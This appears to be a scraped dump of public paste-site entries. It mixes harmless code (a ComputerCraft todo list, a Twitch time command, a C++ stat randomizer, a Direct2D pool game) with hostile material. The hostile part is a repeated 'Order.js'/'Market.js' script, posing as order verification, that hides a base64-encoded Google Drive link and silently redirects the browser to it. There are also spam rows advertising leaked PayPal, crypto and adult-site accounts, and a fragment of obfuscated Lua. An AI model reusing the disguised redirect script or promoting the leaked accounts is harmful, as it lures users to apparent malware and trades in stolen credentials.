e=e+0x01 n[l]=(0x2d);end return true end)'rZEof'and l[0x1](f+0x7b))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x32);c[a]=de();a=a+t;end return true end)'jmLaH'and l[0x3](f+0x2c3))or f end),(function(o)if r>0x25 then return o end r=r+1 e=(e+0xdfe-o)%0xb return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x18);end return true end)'BcGxu'and l[0x2](0x18e+o))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x9c);end return true end)'MtFlf'and l[0x3](o+0x260))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3e);t[2]=(t[2]*(ne(function()c()end,u(d))-ne(t[1],u(d))))+1;c[a]={};t=t[2];a=a+t;end return true end)'gydcm'and l[0x1](o+0x374))or o end),(function(o)if r>0x25 then return o end r=r+1 e=(e+0xc1e-o)%0x4e return(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3c);end return true end)'FWf_o'and l[0x2](0x8e+o))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x60);end return true end)'rypJD'and l[0x3](o+0x3cb))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x3);d='\37';t={function()t()end};d=d..'\100\43';end return true end)'LUFWk'and l[0x1](o+0x23d))or o end)}l[0x3](0x2a5)end){};local e=le(u(c));return e(...);end return j((function()local n={}local e=0x01;local l;if o.cGdpbGAt then l=o.cGdpbGAt(j)else l=''end if o.KYAeIutp(l,o.SdiaIakO)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(n,e,l,t,d,o)local o;if 3<n then if 5<n then if 7<=n then if n>7 then do return l(n,nil,l);end else do return setmetatable({},{['__\99\97\108\108']=function(e,l,t,d,n)if n then return e[n]elseif d then return e else e[l]=t end end})end end else do return d[l]end;end else if n>=0 then repeat if n>4 then local n=t;do return function()local e=e(l,n(n,n),n(n,n));n(1);return e;end;end;break;end;local n=t;local d,t,a=d(2);do return function()local e,o,l,r=e(l,n(n,n),n(n,n)+3);n(4);return(r*d)+(l*t)+(o*a)+e;end;end;until true;else local n=t;do return function()local e=e(l,n(n,n),n(n,n));n(1);return e;end;end;end end else if n<=1 then if n>=-4 then for o=36,56 do if n~=1 then do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;break;end;do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;break;end;else do return function(l,e,n)if n then local e=(l/2^(e-1))%2^((n-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(l%(e+e)>=e)and 1 or 0;end;end;end;end else if n>0 then repeat if 3~=n then do return 16777216,65536,256 end;break;end;do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;until true;else do return e(1),e(4,d,t,l,e),e(5,d,t,l)end;end end end end),...)"
THesd6x1,Order.js,dentira,JavaScript,Saturday 26th of April 2025 11:25:26 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72660/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
waEXRZL6,Chaturbate with Tokens,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:20:56 PM CDT,69968 Accounts Posted On https://t.me/leakedbyem1nem
Zqsn7Ai6,Market.js,dentira,JavaScript,Saturday 26th of April 2025 11:10:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67247/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Yuqfd0c6,Crypto Accounts,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 11:05:33 PM CDT,13932 Accounts Posted On https://t.me/leakedbyem1nem
ndGfRHhT,TimeKriket,SilkKheldar,JavaScript,Saturday 26th of April 2025 11:01:45 PM CDT,"let version  = ""1.0"";
let createdt = ""27 april 2025"";

!addcom !time Right now Kriket's local date and time is $(time Australia/Canberra)

let usage    = '!addcom !time -ul=moderator -cd=5 $(eval u=""$(querystring)"";$(urlfetch json https://pastebin.com/raw/ndGfRHhT))';
let designer = ""UrTeamLEader/Silkenator"";
let o        = """";
let r        = """";
let u2       = """";  
 
let max_len  = 200; 
let m_s_len  = 49; 
let m_l_len  = 68; 
let u_len    = 0;      
 
m_l=""Right now Kriket's local date and time is $(time Australia/Canberra)"";
m_s=""Kriket's local time is $(time Australia/Canberra)"";
if(u)
  {
    u2 = decodeURIComponent(u);
    u_len = u2.length + 1;
    if((u_len + m_l_len) <= max_len) 
      {
        o = u2 + ' ' + m_l;
      }
    else
      { 
        if((u_len + m_s_len) <= max_len)
          {
            o = u2 + ' ' + m_s;
          }
        else
          {
             u2s = u2.slice(0,(max_len - m_s_len));
             o = u2s + ' ' + m_s;
          }          
      }
   }
else
  {
    o = m_l;
  }
 
o; "
7YsTMEUf,Untitled,dentira,JavaScript,Saturday 26th of April 2025 10:54:34 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/47305/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
tAgf2tvw,PayPal with Balance,Ratqueenkslskskwkw,JavaScript,Saturday 26th of April 2025 10:50:10 PM CDT,78534 Accounts Posted On https://t.me/leakedbyem1nem
WsQLVYx4,Untitled,Epiphemeral,JavaScript,Saturday 26th of April 2025 10:39:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/60856/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
y70YtnAD,Todo List,Alexr360,Lua,Saturday 26th of April 2025 10:35:55 PM CDT,"-- todo.lua
-- A simple terminal+monitor todo list with notes, completed section, clickable buttons including restore, backup, and sync commands

-- CONFIGURATION: change this if your monitor is on a fixed side
local MONITOR_SIDE = nil  -- or e.g. ""right"", ""left"", ""back""

-- Determine monitor peripheral and side name
local monitorSide
if MONITOR_SIDE then
  monitorSide = MONITOR_SIDE
else
  for _, side in ipairs(peripheral.getNames()) do
    if peripheral.getType(side) == ""monitor"" then
      monitorSide = side
      break
    end
  end
end
local monitor = monitorSide and peripheral.wrap(monitorSide)
if not monitor then
  error(""No monitor found! Attach a monitor and try again."")
end

-- Text settings
monitor.setTextScale(0.5)
monitor.setBackgroundColor(colors.black)
monitor.setTextColor(colors.white)

-- Data files
local TODO_FILE = ""todo.txt""
local NOTES_FILE = ""notes.txt""
local COMPLETED_FILE = ""completed.txt""

-- Backup paths
local DISK = ""/disk/""
local BUP_TODO = DISK .. TODO_FILE
local BUP_NOTES = DISK .. NOTES_FILE
local BUP_COMPLETED = DISK .. COMPLETED_FILE

-- Data tables
local items = {}
local notes = """"
local completed = {}

-- Utility: load list from file into table
local function loadList(file)
  local tbl = {}
  if fs.exists(file) then
    local f = fs.open(file, ""r"")
    local line = f.readLine()
    while line do
      table.insert(tbl, line)
      line = f.readLine()
    end
    f.close()
  end
  return tbl
end

-- Initial load
items = loadList(TODO_FILE)
completed = loadList(COMPLETED_FILE)
if fs.exists(NOTES_FILE) then
  local f = fs.open(NOTES_FILE, ""r"")
  notes = f.readAll() or """"
  f.close()
end

-- Utility: save all data
local function save()
  local f = fs.open(TODO_FILE, ""w"") for _,v in ipairs(items) do f.writeLine(v) end f.close()
  local f2 = fs.open(COMPLETED_FILE, ""w"") for _,v in ipairs(completed) do f2.writeLine(v) end f2.close()
  local f3 = fs.open(NOTES_FILE, ""w"") f3.write(notes) f3.close()
end

-- Button mapping
local buttons = {}

-- Redraw monitor with buttons
local function redraw()
  monitor.clear()
  local w,h = monitor.getSize()
  local y = 1
  buttons = {}

  -- Notes section
  if notes:match(""%S"") then
    monitor.setCursorPos(1,y) monitor.write(""Notes:"") y=y+1
    local noteLine = notes
    if #noteLine > w then noteLine = noteLine:sub(1,w-3)..""..."" end
    monitor.setCursorPos(1,y) monitor.write(noteLine) y=y+1
    -- blank line after notes
    y=y+1
  end

  -- To-Do List
  monitor.setCursorPos(1,y) monitor.write(""To-Do List:"") y=y+1
  for i=1,math.min(#items, h-y) do
    local text = string.format(""%2d. %s"", i, items[i])
    if #text > w-6 then text = text:sub(1,w-9)..""..."" end
    monitor.setCursorPos(1,y+i-1) monitor.write(text)
    -- Done button
    local bx = w-3
    monitor.setCursorPos(bx, y+i-1) monitor.write(""[D]"")
    table.insert(buttons, {x1=bx, x2=bx+2, y=y+i-1, type=""done"", idx=i})
  end
  y = y + math.min(#items,h-y) + 1

  -- Completed Section
  if #completed > 0 and y < h then
    monitor.setCursorPos(1,y) monitor.write(""Completed:"") y=y+1
    for i=1,math.min(#completed, h-y+1) do
      local entry = completed[i]
      local text = ""- ""..entry
      if #text > w-10 then text = text:sub(1,w-13)..""..."" end
      monitor.setCursorPos(1,y+i-1) monitor.write(text)
      -- Restore button
      local rx = w-7
      monitor.setCursorPos(rx, y+i-1) monitor.write(""[R]"")
      table.insert(buttons, {x1=rx, x2=rx+2, y=y+i-1, type=""restore"", idx=i})
      -- Delete button
      local dx = w-3
      monitor.setCursorPos(dx, y+i-1) monitor.write(""[X]"")
      table.insert(buttons, {x1=dx, x2=dx+2, y=y+i-1, type=""delete"", idx=i})
    end
  end
end

-- Handle touch events
local function handleTouch(x,y)
  for _,b in ipairs(buttons) do
    if y==b.y and x>=b.x1 and x<=b.x2 then
      if b.type==""done"" then
        table.insert(completed, items[b.idx]); table.remove(items, b.idx)
      elseif b.type==""restore"" then
        table.insert(items, completed[b.idx]); table.remove(completed, b.idx)
      elseif b.type==""delete"" then
        table.remove(completed, b.idx)
      end
      save()
      redraw()
      return
    end
  end
end

-- Initial draw
redraw()

-- Main loops: touch handler and command handler
parallel.waitForAny(
  function()
    while true do
      local event, side, x, y = os.pullEvent(""monitor_touch"")
      if side==monitorSide then handleTouch(x,y) end
    end
  end,
  function()
    while true do
      term.clear() term.setCursorPos(1,1)
      print(""Commands: add <item>, remove <num>, done <num>, clear, clearcompleted, backup, sync, note <text>, clearnote, exit"")
      io.write(""Command: "")
      local input = read()
      local cmd,rest = input:match(""^(%S+)%s*(.*)$"") or {input, """"}
      if cmd==""add"" and #rest>0 then
        table.insert(items,rest)
      elseif cmd==""remove"" and tonumber(rest) and items[tonumber(rest)] then
        table.remove(items,tonumber(rest))
      elseif cmd==""done"" and tonumber(rest) and items[tonumber(rest)] then
        table.insert(completed,items[tonumber(rest)]); table.remove(items,tonumber(rest))
      elseif cmd==""clear"" then
        items = {}
      elseif cmd==""clearcompleted"" then
        completed = {}
      elseif cmd==""backup"" then
        -- delete existing backups to prevent file exists errors
        if fs.exists(BUP_TODO) then fs.delete(BUP_TODO) end
        if fs.exists(BUP_COMPLETED) then fs.delete(BUP_COMPLETED) end
        if fs.exists(BUP_NOTES) then fs.delete(BUP_NOTES) end
        -- perform backup
        if fs.exists(TODO_FILE) then fs.copy(TODO_FILE, BUP_TODO) end
        if fs.exists(COMPLETED_FILE) then fs.copy(COMPLETED_FILE, BUP_COMPLETED) end
        if fs.exists(NOTES_FILE) then fs.copy(NOTES_FILE, BUP_NOTES) end
        print(""Backup complete. Press Enter to continue."") read()
      elseif cmd==""sync"" then
        -- delete existing files before sync
        if fs.exists(TODO_FILE) then fs.delete(TODO_FILE) end
        if fs.exists(COMPLETED_FILE) then fs.delete(COMPLETED_FILE) end
        if fs.exists(NOTES_FILE) then fs.delete(NOTES_FILE) end
        -- overwrite existing files from backup
        if fs.exists(BUP_TODO) then fs.copy(BUP_TODO, TODO_FILE) end
        if fs.exists(BUP_COMPLETED) then fs.copy(BUP_COMPLETED, COMPLETED_FILE) end
        if fs.exists(BUP_NOTES) then fs.copy(BUP_NOTES, NOTES_FILE) end
        -- reload data
        items = loadList(TODO_FILE)
        completed = loadList(COMPLETED_FILE)
        if fs.exists(NOTES_FILE) then local f = fs.open(NOTES_FILE, ""r""); notes = f.readAll() or """"; f.close() else notes = """" end
        print(""Sync complete. Press Enter to continue."") read()
      elseif cmd==""note"" then
        notes = rest or """"
      elseif cmd==""clearnote"" then
        notes = """"
      elseif cmd==""exit"" then
        print(""Goodbye!"") os.exit()
      else
        print(""Invalid command. Press Enter to continue."") read()
      end
      save()
      redraw()
    end
  end
)
"
dYyhx7hu,Leaked Accounts - Fresh Hits,kammex,JavaScript,Saturday 26th of April 2025 10:34:38 PM CDT,71041 Accounts Posted On https://t.me/leakedbyem1nem
MBdk8MuS,Products.js,Epiphemeral,JavaScript,Saturday 26th of April 2025 10:23:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31123/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nPueQerR,Chaturbate with Tokens,kammex,JavaScript,Saturday 26th of April 2025 10:19:15 PM CDT,52851 Accounts Posted On https://t.me/leakedbyem1nem
8m84ZDCL,C++ Simple Stat Randomizer,shadowlucario50,C++,Saturday 26th of April 2025 10:15:03 PM CDT,"#include <iostream>
#include <ctime>

void hp(int base);
void attack(int base);
void defense(int base);
void speed(int base);

int main(){
    //Assignment: Create a unique function.
    //Challenge: Calculate stats in other functions and return them.
    srand(time(0));
    int base_stat = 0;

    do{
    std::cout << ""Enter in a base stat (0-50): "";
    std::cin >> base_stat;
    if(base_stat > 50 || base_stat <= 0){
        std::cout << ""Stat not in range! "";
        base_stat = 0;
    }
    }while (base_stat == 0);

    std::cout << ""Stats\n"";
    hp(base_stat);
    attack(base_stat);
    defense(base_stat);
    speed(base_stat);

    return 0;

}

void hp(int base){
    base;
    int hp = rand() % 11 + base + 30;
    std::cout << ""HP: "" << hp << '\n';
}

void attack(int base){
    base;
    int attack = rand() % 11 + base;
    std::cout << ""Attack: "" << attack << '\n';
}

void defense(int base){
    base;
    int defense = rand() % 11 + base;
    std::cout << ""Defense: "" << defense << '\n';
}

void speed(int base){
    base;
    int speed = rand() % 11 + base;
    std::cout << ""Speed: "" << speed << '\n';
}"
WKTzdCjy,Order.js,Epiphemeral,JavaScript,Saturday 26th of April 2025 10:08:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48053/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jkN8eMvZ,Crypto Accounts,kammex,JavaScript,Saturday 26th of April 2025 10:03:52 PM CDT,15984 Accounts Posted On https://t.me/leakedbyem1nem
M7tv2ntv,Market.js,Epiphemeral,JavaScript,Saturday 26th of April 2025 09:53:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/67946/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
YMxvaJqG,PayPal with Balance,kammex,JavaScript,Saturday 26th of April 2025 09:48:29 PM CDT,49686 Accounts Posted On https://t.me/leakedbyem1nem
DAJD8Hf7,Untitled,Epiphemeral,JavaScript,Saturday 26th of April 2025 09:37:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/97683/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dS4DB7EF,2D 8-Ball Pool Using Vector Graphics: Sound Playback Potential Fix V8,alien_fx_fiend,C++,Saturday 26th of April 2025 09:34:46 PM CDT,"==++ Here's the full source for (file 1/3 (No OOP-based)) ""Pool-Game-Clone.cpp""::: ++==
```Pool-Game-Clone.cpp
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <d2d1.h>
#include <dwrite.h>
#include <vector>
#include <cmath>
#include <string>
#include <sstream> // Required for wostringstream
#include <algorithm> // Required for std::max, std::min
#include <ctime>    // Required for srand, time
#include <cstdlib> // Required for srand, rand (often included by others, but good practice)
#include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
#include <mmsystem.h> // For PlaySound
#include ""resource.h""

#pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
#pragma comment(lib, ""d2d1.lib"")
#pragma comment(lib, ""dwrite.lib"")
#pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

// --- Constants ---
const float PI = 3.1415926535f;
const float BALL_RADIUS = 10.0f;
const float TABLE_LEFT = 100.0f;
const float TABLE_TOP = 100.0f;
const float TABLE_WIDTH = 700.0f;
const float TABLE_HEIGHT = 350.0f;
const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
const float CUSHION_THICKNESS = 20.0f;
const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
const float MAX_SHOT_POWER = 15.0f;
const float FRICTION = 0.985f; // Friction factor per frame
const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
const UINT ID_TIMER = 1;
const int TARGET_FPS = 60; // Target frames per second for timer

// --- Enums ---
// --- MODIFIED/NEW Enums ---
enum GameState {
    SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
    PRE_BREAK_PLACEMENT,// Player placing cue ball for break
    BREAKING,           // Player is aiming/shooting the break shot
    AIMING,             // Player is aiming
    AI_THINKING,        // NEW: AI is calculating its move
    SHOT_IN_PROGRESS,   // Balls are moving
    ASSIGNING_BALLS,    // Turn after break where ball types are assigned
    PLAYER1_TURN,
    PLAYER2_TURN,
    BALL_IN_HAND_P1,
    BALL_IN_HAND_P2,
    GAME_OVER
};

enum BallType {
    NONE,
    SOLID,  // Yellow (1-7)
    STRIPE, // Red (9-15)
    EIGHT_BALL, // Black (8)
    CUE_BALL // White (0)
};

// NEW Enums for Game Mode and AI Difficulty
enum GameMode {
    HUMAN_VS_HUMAN,
    HUMAN_VS_AI
};

enum AIDifficulty {
    EASY,
    MEDIUM,
    HARD
};

// --- Structs ---
struct Ball {
    int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
    BallType type;
    float x, y;
    float vx, vy;
    D2D1_COLOR_F color;
    bool isPocketed;
};

struct PlayerInfo {
    BallType assignedType;
    int ballsPocketedCount;
    std::wstring name;
};

// --- Global Variables ---

// Direct2D & DirectWrite
ID2D1Factory* pFactory = nullptr;
ID2D1HwndRenderTarget* pRenderTarget = nullptr;
IDWriteFactory* pDWriteFactory = nullptr;
IDWriteTextFormat* pTextFormat = nullptr;
IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

// Game State
HWND hwndMain = nullptr;
GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
std::vector<Ball> balls;
int currentPlayer = 1; // 1 or 2
PlayerInfo player1Info = { BallType::NONE, 0, L""Player 1"" };
PlayerInfo player2Info = { BallType::NONE, 0, L""CPU"" }; // Default P2 name
bool foulCommitted = false;
std::wstring gameOverMessage = L"""";
bool firstBallPocketedAfterBreak = false;
std::vector<int> pocketedThisTurn;

// NEW Game Mode/AI Globals
GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
// bool aiIsThinking = false;       // Replaced by AI_THINKING game state

// Input & Aiming
POINT ptMouse = { 0, 0 };
bool isAiming = false;
bool isDraggingCueBall = false;
bool isSettingEnglish = false;
D2D1_POINT_2F aimStartPoint = { 0, 0 };
float cueAngle = 0.0f;
float shotPower = 0.0f;
float cueSpinX = 0.0f; // Range -1 to 1
float cueSpinY = 0.0f; // Range -1 to 1

// UI Element Positions
D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

// Corrected Pocket Center Positions (aligned with table corners/edges)
const D2D1_POINT_2F pocketPositions[6] = {
    {TABLE_LEFT, TABLE_TOP},                           // Top-Left
    {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
    {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
    {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
    {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
    {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
};

// Colors
const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green
const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Yellow); // Solids = Yellow
